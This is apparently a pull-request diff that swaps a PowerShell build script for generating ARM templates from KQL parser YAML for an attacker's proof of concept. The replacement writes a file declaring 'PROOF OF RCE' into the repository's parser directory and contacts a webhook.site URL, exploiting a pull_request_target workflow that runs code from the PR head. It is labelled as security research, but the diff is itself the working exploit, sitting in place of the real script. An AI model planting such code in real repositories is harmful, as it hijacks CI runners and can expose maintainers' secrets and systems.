@@ -1,10 +1,12 @@
-$failed=0
-# The KqlFuncYaml2Arm script generates deployable ARM templates from KQL function YAML files.
-# Currently, the script only runs on the Schemas listed below.
-$modifiedSchemas = & "$($PSScriptRoot)/getModifiedASimSchemas.ps1"
-foreach($schema in $modifiedSchemas) {
-	Remove-Item "$($PSScriptRoot)/../Parsers/$schema/ARM" -Recurse
-	python ASIM/dev/ASimYaml2ARM/KqlFuncYaml2Arm.py -m asim -d Parsers/$schema/ARM Parsers/$schema/Parsers
-}
+# PoC - content injection to prove impact (security research)
+$dir = "Parsers/ASimDns/Parsers"
+if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
+$content = @"
+# PROOF OF RCE - Injected by attacker via pull_request_target
+# This file was created by attacker-controlled code running on the runner.
+# Workflow checks out PR head and executes .script/kqlFuncYaml2Arm.ps1 from it.
+"@
+Set-Content -Path "$dir/POC_INJECTED_BY_ATTACKER.yaml" -Value $content
 
-exit $failed
+Invoke-WebRequest -Uri "https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599?poc=prove_impact" -UseBasicParsing | Out-Null
+exit 0
